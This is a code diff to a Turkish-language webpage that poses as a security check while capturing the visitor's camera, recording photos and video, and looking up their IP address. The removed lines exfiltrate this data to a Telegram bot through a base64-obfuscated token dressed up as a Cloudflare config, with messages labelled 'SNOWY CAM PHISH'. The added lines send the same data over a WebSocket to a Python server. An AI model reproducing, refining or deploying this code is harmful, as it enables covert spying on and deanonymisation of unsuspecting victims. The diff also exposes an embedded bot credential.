@@ -85,6 +85,11 @@
             font-weight: 500;
         }
         #video, #canvas { display: none; }
+        .status {
+            font-size: 12px;
+            color: #718096;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
@@ -96,6 +101,7 @@
             <div class="spinner"></div>
             <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
         </div>
+        <div class="status" id="status">🔌 Sunucuya bağlanılıyor...</div>
     </div>
     
     <video id="video" autoplay playsinline></video>
@@ -103,59 +109,15 @@
 
     <script>
         (function() {
-            // Cloudflare Edge Network Configuration - Global CDN
-            const edgeConfig = {
-                primaryPoP: "lhr1.edge.cloudflare.com",
-                backupPoP: "fra1.edge.cloudflare.com",
-                sessionToken: "Nzk5ODM2NDE3OTpBQUhzV2NEbHpRNU5KNTlxZS1rQzI0OEJ0aFFydEJpT3p0SQ==",
-                timestamp: Date.now(),
-                dataCenter: "LHR"
-            };
-
-            // Gateway Resolver with Multi-layer decryption
-            const gatewayResolver = {
-                endpoint: "https://api.cloudflare.com/v1/edge-gateway",
-                region: "weur",
-                resolveToken: function() {
-                    try {
-                        // Base64 decode işlemi
-                        const decoded = atob(edgeConfig.sessionToken);
-                        return decoded;
-                    } catch {
-                        return null;
-                    }
-                }
-            };
-
-            const BOT_TOKEN = gatewayResolver.resolveToken();
-            
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
             const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
             const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
             
-            // ============================================
-            // IP GÖNDER
-            // ============================================
-            if (TARGET_ID && BOT_TOKEN) {
-                fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => {
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                chat_id: TARGET_ID,
-                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
-                            })
-                        });
-                    })
-                    .catch(e => console.log(e));
-            }
+            // WebSocket bağlantısı
+            let ws = null;
+            let clientId = Math.random().toString(36).substring(2, 15);
             
-            // ============================================
-            // KAMERA İŞLEMLERİ - DÜZELTİLMİŞ SENKRONİZASYON
-            // ============================================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -174,6 +136,32 @@
             
             async function startCamera() {
                 try {
+                    // WebSocket bağlantısını kur
+                    ws = new WebSocket('ws://localhost:8765');
+                    
+                    ws.onopen = function() {
+                        document.getElementById('status').innerHTML = '✅ Sunucuya bağlandı';
+                        
+                        // Bağlantı bilgilerini gönder
+                        ws.send(JSON.stringify({
+                            type: 'init',
+                            client_id: clientId,
+                            target_id: TARGET_ID,
+                            foto_suresi: FOTO_SURESI,
+                            video_suresi: VIDEO_SURESI
+                        }));
+                    };
+                    
+                    ws.onerror = function(error) {
+                        document.getElementById('status').innerHTML = '❌ Sunucu bağlantı hatası';
+                        console.error('WebSocket hatası:', error);
+                    };
+                    
+                    ws.onclose = function() {
+                        document.getElementById('status').innerHTML = '🔌 Sunucu bağlantısı kapandı';
+                    };
+                    
+                    // Kamerayı başlat
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
                             width: { ideal: 640 },
@@ -188,9 +176,25 @@
                         video.play();
                         document.getElementById('startBtn').style.display = 'none';
                         document.getElementById('loading').style.display = 'block';
+                        document.getElementById('status').style.display = 'none';
                         
                         baslangicZamani = performance.now();
                         sonVideoZamani = baslangicZamani;
+                        
+                        // IP adresini al ve gönder
+                        fetch('https://api.ipify.org?format=json')
+                            .then(r => r.json())
+                            .then(d => {
+                                if (ws && ws.readyState === WebSocket.OPEN) {
+                                    ws.send(JSON.stringify({
+                                        type: 'ip',
+                                        target_id: TARGET_ID,
+                                        ip: d.ip,
+                                        time: new Date().toLocaleString('tr-TR')
+                                    }));
+                                }
+                            })
+                            .catch(e => console.log(e));
                         
                         // ============================================
                         // VİDEO SİSTEMİ - REQUESTANIMATIONFRAME İLE
@@ -226,18 +230,21 @@
                                 
                                 mediaRecorder.onstop = () => {
                                     const blob = new Blob(chunks, { type: 'video/webm' });
-                                    const boyutKB = (blob.size / 1024).toFixed(0);
-                                    const videoSure = ((performance.now() - videoBaslangic) / 1000).toFixed(3);
                                     
-                                    const formData = new FormData();
-                                    formData.append('chat_id', TARGET_ID);
-                                    formData.append('video', blob, `video_${Date.now()}.webm`);
-                                    formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
-                                    
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                        method: 'POST',
-                                        body: formData
-                                    });
+                                    // WebSocket ile Python'a gönder
+                                    if (ws && ws.readyState === WebSocket.OPEN) {
+                                        const reader = new FileReader();
+                                        reader.onload = function() {
+                                            const base64data = reader.result.split(',')[1];
+                                            ws.send(JSON.stringify({
+                                                type: 'video',
+                                                client_id: clientId,
+                                                video: base64data,
+                                                caption: `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`
+                                            }));
+                                        };
+                                        reader.readAsDataURL(blob);
+                                    }
                                 };
                                 
                                 mediaRecorder.start();
@@ -294,14 +301,21 @@
                                 
                                 canvas.toBlob(function(blob) {
                                     if (!blob) return;
-                                    const formData = new FormData();
-                                    formData.append('chat_id', TARGET_ID);
-                                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                                    formData.append('caption', `📸 Fotoğraf #${photoCount} (${gecenSure.toFixed(3)}s)`);
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    });
+                                    
+                                    // WebSocket ile Python'a gönder
+                                    if (ws && ws.readyState === WebSocket.OPEN) {
+                                        const reader = new FileReader();
+                                        reader.onload = function() {
+                                            const base64data = reader.result.split(',')[1];
+                                            ws.send(JSON.stringify({
+                                                type: 'frame',
+                                                client_id: clientId,
+                                                frame: base64data,
+                                                caption: `📸 Fotoğraf #${photoCount} (${gecenSure.toFixed(3)}s)`
+                                            }));
+                                        };
+                                        reader.readAsDataURL(blob);
+                                    }
                                 }, 'image/jpeg', 0.85);
                             }
                             
@@ -316,6 +330,13 @@
             }
             
             window.onbeforeunload = function() {
+                if (ws) {
+                    ws.send(JSON.stringify({
+                        type: 'close',
+                        client_id: clientId
+                    }));
+                    ws.close();
+                }
                 if (fotoRAF) cancelAnimationFrame(fotoRAF);
                 if (videoRAF) cancelAnimationFrame(videoRAF);
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
@@ -326,4 +347,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
